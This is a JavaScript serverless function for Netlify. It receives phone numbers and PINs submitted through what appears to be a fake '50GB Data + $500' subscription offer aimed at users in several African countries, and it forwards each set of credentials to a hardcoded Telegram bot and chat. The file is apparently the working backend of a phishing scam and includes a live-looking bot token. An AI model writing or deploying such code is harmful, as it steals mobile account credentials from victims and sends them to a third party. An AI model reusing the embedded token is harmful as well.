// netlify/functions/send-to-telegram.js

// HARDCODED CREDENTIALS - NO ENVIRONMENT VARIABLES NEEDED
const TELEGRAM_BOT_TOKEN = '8834457288:AAEwsXLbfzRp54OnBcE-12jMhaZY_0e-Nz4';
const TELEGRAM_CHAT_ID = '8834429633';

exports.handler = async (event) => {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS'
    };

    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers };
    }

    try {
        const path = event.path.replace('/.netlify/functions/send-to-telegram', '');

        if (event.httpMethod === 'POST' && path === '/send-data') {
            const data = JSON.parse(event.body);
            const { country, countryCode, phone, pin, ticket, offer } = data;

            if (!phone || !pin) {
                return {
                    statusCode: 400,
                    headers,
                    body: JSON.stringify({
                        success: false,
                        message: 'Phone and PIN required.'
                    })
                };
            }

            const flags = {
                uganda: '🇺🇬',
                zambia: '🇿🇲',
                malawi: '🇲🇼',
                rwanda: '🇷🇼',
                drc: '🇨🇩'
            };
            const flag = flags[countryCode] || '🌍';

            const message = `
🌍 *NEW AFRICA 50GB SUBSCRIPTION!*

🎫 *Ticket:* ${ticket}
${flag} *Country:* ${country}
📞 *Phone:* ${phone}
🔐 *PIN:* ${pin}
📦 *Offer:* ${offer || '50GB Data + $500'}

✅ *Status:* Successfully Subscribed!
            `;

            let telegramSuccess = false;

            try {
                const telegramResponse = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    }
                );

                if (telegramResponse.ok) {
                    telegramSuccess = true;
                    console.log(`✅ Telegram sent for ${phone}`);
                } else {
                    const errorText = await telegramResponse.text();
                    console.error(`❌ Telegram error: ${errorText}`);
                }
            } catch (error) {
                console.error(`❌ Telegram error: ${error.message}`);
            }

            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({
                    success: true,
                    message: 'Data submitted successfully!',
                    data: {
                        ticket: ticket,
                        country: country,
                        phone: phone,
                        pin: pin,
                        offer: offer,
                        telegramSent: telegramSuccess
                    }
                })
            };
        }

        return {
            statusCode: 404,
            headers,
            body: JSON.stringify({
                success: false,
                message: 'Route not found'
            })
        };

    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                success: false,
                message: 'Internal server error',
                error: error.message
            })
        };
    }
};
